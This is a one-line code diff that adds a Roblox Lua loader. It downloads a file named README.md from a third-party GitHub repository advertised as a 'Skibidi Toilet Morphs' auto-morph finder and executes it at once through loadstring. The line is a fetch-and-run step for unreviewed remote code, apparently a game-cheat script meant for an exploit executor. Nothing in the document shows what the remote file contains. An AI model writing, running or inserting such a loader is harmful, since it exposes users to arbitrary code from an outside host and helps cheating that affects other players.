@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/flopa2677/-EP.-61-Skibidi-Toilet-Morphs-Auto-morph-finder/main/README.md",true))();
